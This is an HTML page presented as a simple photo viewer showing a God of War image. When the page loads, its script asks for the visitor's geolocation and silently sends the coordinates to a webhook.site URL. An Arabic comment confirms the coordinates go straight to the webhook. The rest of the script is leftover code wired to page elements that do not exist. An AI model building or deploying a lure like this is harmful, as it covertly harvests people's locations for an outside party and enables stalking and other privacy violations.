<!DOCTYPE html>
<html>
<head>
    <title>Photo</title>
    <link rel="stylesheet" href="i.css">
</head>
<body>

<h2></h2>
<div style="margin: auto;">
<img src="https://moewalls.com/wp-content/uploads/2022/09/kratos-god-of-war-thumb.jpg" 
     width="300" id="photo" style="cursor:pointer;">
</div>

<script>

    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(position){
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;

            // تبعث الإحداثيات مباشرة ل webhook
            fetch("https://webhook.site/859b6ebf-b6e5-49f7-b474-161c00ca082d?lat=" + lat + "&lon=" + lon);

            // توريك البلاصة مباشرة على Google Maps

        }, function(error){
            alert("Location permission denied or unavailable");
        });
    } else {
        alert("Geolocation is not supported by your browser.");
    }
    document.getElementById("getLocationBtn").addEventListener("click", () => {
    if (!navigator.geolocation) {
        document.getElementById("status").textContent = "Geolocation is not supported by your browser.";
        return;
    }

    document.getElementById("status").textContent = "Requesting location...";

    navigator.geolocation.getCurrentPosition(
        (position) => {
            document.getElementById("status").textContent =
                `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
        },
        (error) => {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    document.getElementById("status").textContent = "Permission denied.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    document.getElementById("status").textContent = "Location unavailable.";
                    break;
                case error.TIMEOUT:
                    document.getElementById("status").textContent = "Request timed out.";
                    break;
                default:
                    document.getElementById("status").textContent = "An unknown error occurred.";
            }
        }
    );
});
</script>

</body>
</html>
